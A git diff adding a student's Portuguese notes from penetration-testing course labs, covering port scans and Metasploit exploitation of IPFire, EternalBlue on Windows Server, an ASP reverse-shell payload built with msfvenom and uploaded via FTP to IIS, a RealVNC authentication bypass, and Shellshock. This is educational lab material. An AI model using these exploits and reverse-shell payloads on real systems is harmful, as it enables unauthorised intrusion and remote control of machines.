@@ -1,0 +1,192 @@
+
+
+ANOTAÇÕES
+- COLOCAR EM ALGUM LUGAR QUE TU TEM QUE USAR OS SITES DE PESQUISA SEMPRE ANTES DO METASPLOIT
+
+
+
+LAB 1 ---------------------------------------------------------------------------------------------------
+Scan de portas - db_nmap -v -sS --top-ports 1000 -Pn 172.16.1.100
+Acessando https://172.16.1.100:444 ele pede senha de usuário
+Como após acessar como icone da pra ver que o bloqueio vem de um Firewall IP fire como vimos na aula
+Acessei o projeto do Gitlab dele e vi os diretórios acessíveis
+Pesquisei no metasploit por vulns do IPfire (Deveria verificar versao primeiro)
+*Lembrar que no metaplsoit tu tem que setar o CMD (set CMD whoiam)
+Como o exploit n funciona agora seria a hora de tentar um bruteforce, como ele passa as credenciais no video ja peguei
+admin:security
+Com elas da pra rodar os exploits sejam qual forem (Aqui quero um pra pegar a CLI dele)
+Escolhe o exploit, se um n funcionar testa outro
+Seleciona payload --> show payloads
+exploit -j 
+sessions -i <sessão>
+EU USO POUCO O SHOW OPTIONS	 OPÇÃO AO INFO
+Cara uma vez dentro começaram outros problemas kkk como achar a key?
+Revirando bem achei um user estranho --> nobody
+Demorei até dar um ls /home/nobody/
+E lá estava ela linda e cintilante!!!!
+
+---------------------------------------------------------------------------------------------------
+
+
+LAB 2 ---------------------------------------------------------------------------------------------------
+Comecei olhando as portas abertas - db_nmap -v -sS --top-ports 1000 -Pn 172.16.1.233
+Tem porta 80 aberta - acessando da pra ver que roda um IS
+Qual a versão do IS ? - whatweb 172.16.1.233
+http://172.16.1.233 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8.5], IP[172.16.1.233], Microsoft-IIS[8.5][Under Construction], Title[IIS Windows Server]
+Meio perdido vi que ele usa SMB
+usei auxiliary(scanner/smb/smb_versio) e peguei versoes dele e nome do server versions:1, 2, 3 
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 8.5
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-29 01:39:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: DHCE.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: DHCE)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: DHCE.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49155/tcp open  msrpc         Microsoft Windows RPC
+49156/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+
+jobs -K
+sessions -K
+
+Porta 135??? --> SMB, guardei essa info
+Comecei a bater versões com o metaplsoit --> search type:exploit Windows Server 2008
+Vi que pra esse cara tinha um eternablue qualquer mas que tem a ver com *SMB*
+Nessa hora me toquei que faz sentido, mas o SMB pro eternalblue tem que ser SMBv1
+Verifiquei que era com o Enumeration de SMB
+ms17_010_eternalblue --> psexec que é mais ok pras verificações
+setei so o RHOSTS como o alvo e LHOST como meu IP de VPN
+set PAYLOAD --> Reverse com meterpreter
+resetei o alvo e tentei duas vezes e foi!!!
+Listing: C:\Users\Administrator\Desktop
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100666/rw-rw-rw-  68    fil   2021-02-11 12:46:22 -0300  confidencial.txt
+100666/rw-rw-rw-  282   fil   2018-02-26 23:23:01 -0300  desktop.ini
+
+---------------------------------------------------------------------------------------------------
+
+
+
+
+LAB3 ---------------------------------------------------------------------------------------------------
+
+[*] Nmap: PORT     STATE SERVICE     VERSION
+[*] Nmap: 21/tcp   open  ftp         Microsoft ftpd
+[*] Nmap: 80/tcp   open  http        Microsoft IIS httpd 6.0
+[*] Nmap: 135/tcp  open  msrpc       Microsoft Windows RPC
+[*] Nmap: 139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
+[*] Nmap: 1026/tcp open  msrpc       Microsoft Windows RPCse
+Comecei com NMAP básico
+Primeiro foco esse FTP aberto,
+tentei as senhas classicas ftp:ftp deu certo
+Fazendo nmap pelo metasploit ele achou que e windows 2003
+Olhando as dicas vi que ele fala sobre FTP e sobre ganhar acesso remoto com a pasta do http
+Me lembrei da criação de payload malicioso
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.20.1.103 LPORT=877 -f asp -o teste.ee
+Porque ASP? --> Porque vi que no dir tinham varios ASPs e so eles abriam 
+Criado o payload malicioso tu precisa do handler no metasplot --> exploit(multi/handler)
+Poe teu Host, Porta e SELECIONA O PAYLOAD QUE TU POS NO MSFVENOM
+Acessando o FTP de novo eu peguei e mandei o payload pro diretorio web do IIS
+
+Agora basta acessar o IP do server e por /<script> que tu pos dentro do dir
+
+
+---------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+LAB 4 ---------------------------------------------------------------------------------------------------
+Nmap scan report for 172.16.1.165
+Host is up (0.25s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+135/tcp  open  msrpc       Microsoft Windows RPC
+139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
+1025/tcp open  msrpc       Microsoft Windows RPC
+5800/tcp open  vnc-http    RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5900)
+5900/tcp open  vnc         VNC (protocol 3.8) [*] 172.16.1.165:5900     - 172.16.1.165:5900 - VNC server protocol version: 3.3
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.95%E=4%D=5/29%OT=135%CT=1%CU=44447%PV=Y%DS=2%DC=I%G=Y%TM=6838FE
+
+Pontos interessantes aqui 
+139 - Netbios
+VNC Aberto
+Buscando por payloads que poderiam combinar achei um great que usa Bypass e RCE
+MLK aqui o que salta aos olhos é o VNC mesmo --> search vnc (bem na pura)
+Revisando tinham varios mas um saltou aos olhos por ser para um VNC 4.1 (Provavel que englobe o nosso)
+   73   auxiliary/admin/vnc/realvnc_41_bypass                               2006-05-15       normal     No     RealVNC NULL Authentication Mode Bypass
+Setar as options bem simples dele, sem mt misterio, apenas com a LPORT 5901 pra nao ser igual a RPORT
+O pulo do gato aqui é que precisei instalar o vnc viewer (tigervnc-viewer)
+E antes de dar o run eu abri uma sessão na tela do pc do kali mesmo --> vncviewer <meuipdaVPN:LPORT>
+Com isso aberto ou meio aberto pelo menos tu da run e bomba a parada automatico
+MT FODA!!!!
+
+
+LAB 5 ----------------------------------------------------------------------------------------------------
+Nmap basico nele
+PORT     STATE  SERVICE       VERSION
+21/tcp   closed ftp
+22/tcp   closed ssh
+23/tcp   closed telnet
+25/tcp   closed smtp
+80/tcp   open   http          Apache httpd 2.2.16 ((Debian))
+110/tcp  closed pop3
+139/tcp  closed netbios-ssn
+443/tcp  closed https
+445/tcp  closed microsoft-ds
+3389/tcp closed ms-wbt-server
+
+Foco na porta 80 e nessa versão
+Revirei o metasploit mas mt coisa, dificil de achar
+Usei o nessus pra fazer um scan voltado a web especificamente e ele retornou uma vul critica
+GNU Bash Environment Variable Handling Code Injection (Shellshock)
+Analisando o retorno do nessus vi que pra achar essa vul ele faz o seguinte
+
+GET /cgi-bin/test.cgi HTTP/1.1 --> Como o server tem esse test.cgi disponivel fica facil o shellshock
+
+Pesquisar por vulns com o CVE-2014-6271 que o Nessus me deu no metasploit
+Achei o exploit do shellshoc focado em Apache httpd e PHP
+
+   Name            Current Setting                       Required  Description
+   ----            ---------------                       --------  -----------
+   CMD_MAX_LENGTH  2048                                  yes       CMD max line length
+   CVE             CVE-2014-6271                         yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent                            yes       HTTP header to use
+   METHOD          GET                                   yes       HTTP method to use
+   Proxies                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS          172.30.0.108                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPATH           /bin                                  yes       Target PATH for binaries used by the CmdStager
+   RPORT           80                                    yes       The target port (TCP)
+   SSL             false                                 no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI       http://172.30.0.108/cgi-bin/test.cgi (Path que achei)  yes       Path to CGI script
+   TIMEOUT         5                                     yes       HTTP read response timeout (seconds)
+   URIPATH                                               no        The URI to use for this exploit (default is random)
+   VHOST                                                 no        HTTP server virtual host
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  172.20.1.60      yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+Payload options (linux/x86/meterpreter/reverse_tcp):
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  172.20.1.60      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+----------------------------------------------------------------------------------------------------
